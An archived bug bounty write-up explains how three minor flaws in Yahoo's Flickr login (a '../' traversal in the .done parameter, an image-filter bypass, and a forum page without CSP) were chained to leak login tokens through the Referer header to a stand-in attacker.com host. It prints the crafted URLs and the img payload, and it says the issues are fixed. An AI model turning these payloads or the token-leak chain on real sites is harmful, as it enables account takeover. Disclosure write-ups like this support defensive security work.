---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-10-13_yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts.md
original_filename: 2017-10-13_yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts.md
title: 'Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts'
category: documents
detected_topics:
- xss
- otp
- oauth
- sso
- command-injection
- api-security
tags:
- imported
- documents
- xss
- otp
- oauth
- sso
- command-injection
- api-security
language: en
raw_sha256: 7ebe0daa53c2579d151f0a5044876cd2f87b46c8918540b013ea590027b35ced
text_sha256: e3f5ba47ae25d44e4a33b7f09eb46adf532c92fb198223c3de96488e4786306d
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-10-13_yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts.md
- Source Type: markdown
- Detected Topics: xss, otp, oauth, sso, command-injection, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `7ebe0daa53c2579d151f0a5044876cd2f87b46c8918540b013ea590027b35ced`
- Text SHA256: `e3f5ba47ae25d44e4a33b7f09eb46adf532c92fb198223c3de96488e4786306d`


## Content

---
title: "Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts"
page_title: "Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts – MISHRE"
url: "https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/"
final_url: "https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/"
authors: ["Michael Reizelman"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["Authentication bypass", "Account takeover"]
bounty: "7,000"
publication_date: "2017-10-13"
added_date: "2024-02-01"
source: "pentester.land/writeups.json"
original_index: 6079
---

# Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts

![](https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA--&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252FThis is the Yahoo account login page where a user is prompted to enter his credentials. After completing the login form and clicking login, the user is first redirected to a Yahoo endpoint where his credentials are verified and then, if they are valid, he is redirected back to the following Flickr url:https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com%2F&.data={first-token-value}&.ys={second-token-value}What happens now is that in the background Flickr verifies the .ys and .data parameters against the Yahoo verification server and logs the user in.Stealing Flickr.com login tokensSo, it appears that if a user is already logged in to Yahoo and clicks the initial link:https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA--&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252FThe flow just happens in the background without the need for a user to enter his credentials in Yahoo. This poses a higher risk of account takeover, due to the fact that the user just needs to click a single link \(like in some OAuth implementations\) for the authentication to happen for him. Knowing this I have started looking for potential bypass to this flow.The first thing I have noticed is that the second .done parameter can be manipulated. This parameter actually controls where the login tokens are sent. It appears that Yahoo’s servers only verify that it starts with https://www.flickr.com/signin/yahoo/ but we can still append ../ so if we append ../../test to the .done original value the .ys and .data tokens will be sent to https://www.flickr.com/test endpoint.So, this gives us a lead since if we find an open redirect somewhere on the https://www.flickr.com/ origin we will be able to send the token to our own server. However, I wasn’t able to find one on the main domain. So, I looked for other ways to leak the token.After some digging I came across this page: https://www.flickr.com/html.gne?tighten=0&type=comment which states that images can be embedded in the comments on different Flickr pages. I thought that maybe if I could post an external image in a comment, the tokens will be leaked to my own server via the referrer field, since they’re still in the landing url. So I posted a comment on my own uploaded image with following content:<img src=”https://attacker.com/someimage.jpg” />The image was really embedded in the comment, but unfortunately Yahoo were manipulating its src  value to the following:https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg&t=1491136241&sig=FGQiNHDOtEj7LQDBbYBnwA–~CThat was actually an internal Yahoo proxy so that Flickr won’t be leaking requests to external servers. BUT, it appeared that if I use some browser tricks I can manipulate the Flickr image processing logic. When posting the following comment:<img src=”\\/\\/www.attacker.com/someimage.jpg” />the comment was not manipulated by the proxy and the src value stayed as is. So what should have happened now is that the image will be shown in the comments section of the photo, right? No, also the browser accepts this as a valid url there was some Content Security Policy applied:Content-Security-Policy:  img-src data: blob: https://*.flickr.com https://*.flickr.net http://*.flickr.net https://*.staticflickr.com http://*.staticflickr.com https://*.yimg.com https://*.yahoo.com https://*.cedexis.com https://*.cedexis-test.com https://*.cedexis-radar.net https://sb.scorecardresearch.com https://image.maps.api.here.com https://csync.yahooapis.com https://*.paypal.com https://*.pinterest.com http://*.static-alpha.flickr.com https://geo-um.btrll.com https://connect.facebook.net https://*.facebook.com https://bs.serving-sys.com https://*.adserver.yahoo.com https://*.maps.api.here.com https://*.maps.cit.api.here.com https://*.ads.yahoo.com https://secure.footprint.net;The img-src configuration blocked it since it was not on the white list, so I wasn’t actually able to embed external images after all.Upon understanding this, I have tried to look if there are other endpoints on Flickr that are also allowing comments. After some time, I came across the forums page: https://www.flickr.com/help/forum/en-us/. It appeared that this page also supports the comments html embedding feature. And more importantly it appeared that there is no CSP applied on all https://www.flickr.com/help/forum/* pages.So I have posted the following comment on a thread in the forum:<img src=”\\/\\/www.attacker.com/someimage.jpg” />And it worked, an external image was embedded here:https://www.flickr.com/help/forum/en-us/72157668446997150/page14/So all I had to do now was to construct the final url which looked like this:https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=cLI6NPLejY6&.scrumb2=GszxN7PzUWX&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=il&.done=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2F..%2Fhelp%2Fforum%2Fen-us%2F72157668446997150%2Fpage14%2FWhat happened when a user clicked on the link is that he was redirected to https://www.flickr.com/help/forum/en-us/72157668446997150/page14?data={some-token}&.ys={second-token} and from here the following request was issued by his browser:GET https://www.attacker.com/someimage.jpg)![flickr](https://mishresec.wordpress.com/wp-content/uploads/2017/10/flickr.png?w=840)

Flickr is an image and video hosting website which is owned by Yahoo and resides on the flickr.com domain.

To handle authentication on Flickr, requests are made to login.yahoo.com to get an access token for the user.

**Overview of the Flickr.com login flow**

When a user wants to login to [Flickr.com](https://web.archive.org/web/20170910094229/https://flickr.com/) he clicks a sign-in button which redirects him to the following url:

> [https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA–&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F](https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA--&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F)

This is the Yahoo account login page where a user is prompted to enter his credentials. After completing the login form and clicking login, the user is first redirected to a Yahoo endpoint where his credentials are verified and then, if they are valid, he is redirected back to the following Flickr url:

> [https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com%2F&.data={first-token-value}&.ys={second-token-value}](https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com%2F&.data={first-token-value}&.ys={second-token-value})

What happens now is that in the background Flickr verifies the ** _.ys_** and **._data_** parameters against the Yahoo verification server and logs the user in.

**Stealing Flickr.com login tokens**

So, it appears that if a user is already logged in to Yahoo and clicks the initial link:

> [https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA–&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F](https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA--&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F)

The flow just happens in the background without the need for a user to enter his credentials in Yahoo. This poses a higher risk of account takeover, due to the fact that the user just needs to click a single link (like in some OAuth implementations) for the authentication to happen for him. Knowing this I have started looking for potential bypass to this flow.

The first thing I have noticed is that the second  _.done_ parameter can be manipulated. This parameter actually controls where the login tokens are sent. It appears that Yahoo’s servers only verify that it starts with  _[https://www.flickr.com/signin/yahoo/](https://www.flickr.com/signin/yahoo/ )_ but we can still append ../ so if we append **../../test** to the  _.done_ original value the  _.ys_ and  _.data_ tokens will be sent to  _<https://www.flickr.com/test>_ endpoint.

So, this gives us a lead since if we find an open redirect somewhere on the https://www.flickr.com/ origin we will be able to send the token to our own server. However, I wasn’t able to find one on the main domain. So, I looked for other ways to leak the token.

After some digging I came across this page: [https://www.flickr.com/html.gne?tighten=0&type=comment](https://web.archive.org/web/20170910094229/https://www.flickr.com/html.gne?tighten=0&type=comment) which states that images can be embedded in the comments on different Flickr pages. I thought that maybe if I could post an external image in a comment, the tokens will be leaked to my own server via the referrer field, since they’re still in the landing url. So I posted a comment on my own uploaded image with following content:

> ![](https://attacker.com/someimage.jpg)![](https://attacker.com/someimage.jpg)![](https://attacker.com/someimage.jpg)<img src=”![](https://attacker.com/someimage.jpg)[https://attacker.com/someimage.jpg”&gt](https://attacker.com/someimage.jpg”&gt);

The image was really embedded in the comment, but unfortunately Yahoo were manipulating its src value to the following:

> [![](https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg)https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg&t=1491136241&sig=FGQiNHDOtEj7LQDBbYBnwA–~C![](https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg)](https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg&t=1491136241&sig=FGQiNHDOtEj7LQDBbYBnwA–~C)

![](https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg)That was actually an internal Yahoo proxy so that Flickr won’t be leaking requests to external servers. **BUT,** it appeared that if I use some browser tricks I can manipulate the Flickr image processing logic. When posting the following comment:

> <img src=”\/\/www.attacker.com/someimage.jpg” />

the comment was not manipulated by the proxy and the  _src_ value stayed as is. So what should have happened now is that the image will be shown in the comments section of the photo, right? No, also the browser accepts this as a valid url there was some Content Security Policy applied:

> Content-Security-Policy: img-src data: blob: <https://*.flickr.com> <https://*.flickr.net> <http://*.flickr.net> <https://*.staticflickr.com> <http://*.staticflickr.com> <https://*.yimg.com> <https://*.yahoo.com> <https://*.cedexis.com> <https://*.cedexis-test.com> <https://*.cedexis-radar.net> <https://sb.scorecardresearch.com> <https://image.maps.api.here.com> <https://csync.yahooapis.com> <https://*.paypal.com> <https://*.pinterest.com> <http://*.static-alpha.flickr.com> <https://geo-um.btrll.com> <https://connect.facebook.net> <https://*.facebook.com> <https://bs.serving-sys.com> <https://*.adserver.yahoo.com> <https://*.maps.api.here.com> <https://*.maps.cit.api.here.com> <https://*.ads.yahoo.com> <https://secure.footprint.net>;

The _img-src_ configuration blocked it since it was not on the white list, so I wasn’t actually able to embed external images after all.

Upon understanding this, I have tried to look if there are other endpoints on Flickr that are also allowing comments. After some time, I came across the forums page: [https://www.flickr.com/help/forum/en-us/](https://web.archive.org/web/20170910094229/https://www.flickr.com/help/forum/en-us/). It appeared that this page also supports the comments html embedding feature. And more importantly it appeared that there is no CSP applied on all https://www.flickr.com/help/forum/* pages.

So I have posted the following comment on a thread in the forum:

> <img src=”\/\/www.attacker.com/someimage.jpg” />

And it worked, an external image was embedded here:

> <https://www.flickr.com/help/forum/en-us/72157668446997150/page14/>

So all I had to do now was to construct the final url which looked like this:

> [https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=cLI6NPLejY6&.scrumb2=GszxN7PzUWX&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=il&.done=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2F..%2Fhelp%2Fforum%2Fen-us%2F72157668446997150%2Fpage14%2F](https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=cLI6NPLejY6&.scrumb2=GszxN7PzUWX&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=il&.done=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2F..%2Fhelp%2Fforum%2Fen-us%2F72157668446997150%2Fpage14%2F)

What happened when a user clicked on the link is that he was redirected to  _<https://www.flickr.com/help/forum/en-us/72157668446997150/page14?data=>{some-token}&.ys={second-token} _and from here the following request was issued by his browser:

> ![](https://www.attacker.com/someimage.jpg)GET <https://attacker.com/someimage.jpg> HTTP/1.1
> 
> Host: <http://www.attacker.com>
> 
> Connection: keep-alive
> 
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
> 
> Accept: image/webp,image/*,*/*;q=0.8
> 
> **Referer:<https://www.flickr.com/help/forum/en-us/72157668446997150/page14/>?.data=_{some-token}_ &.ys=_{second-token}_**
> 
> Accept-Encoding: gzip, deflate, sdch, br
> 
> Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2![](https://www.attacker.com/someimage.jpg)

As you can see the Referer field contained the tokens which were sent to <http://www.attacker.com>. So what the attacker had to do now is just browse to the following url in his browser:

> <https://www.flickr.com/signin/yahoo/>?.data={copied from referer}&.ys={copied from referer}

and he was logged in to the victim’s account.

**Resolution**

Yahoo resolved this by doing several things. First – the .done parameter on the login.yahoo.com endpoint only allows  _<https://www.flickr.com/signin/yahoo/>_ now as a valid value. The image embedding logic’s bypass using “/\/\” is also fixed. And finally, there is now CSP applied on the Flickr forum.

Timeline:

Apr 2nd 2017 – Initial Report via Hackerone

Apr 3rd 2017 – Report Triaged

Apr 10th 2017 – Report Resolved

Apr 21st 2017 – 7K$ Bounty Rewarded

### Share this:

  * [ Share on X (Opens in new window) X ](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/?share=facebook)
  * 

Like Loading...

### _Related_

![Unknown's avatar](https://2.gravatar.com/avatar/27a0c0c355fdfc73f79c8a66dc45fa3c0e95fe08072498e814f4d03f8439ce35?s=49&d=identicon&r=G)Author  [Michael Reizelman](https://mishresec.wordpress.com/author/michaelsitesite/)Posted on [October 13, 2017October 13, 2017](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/)
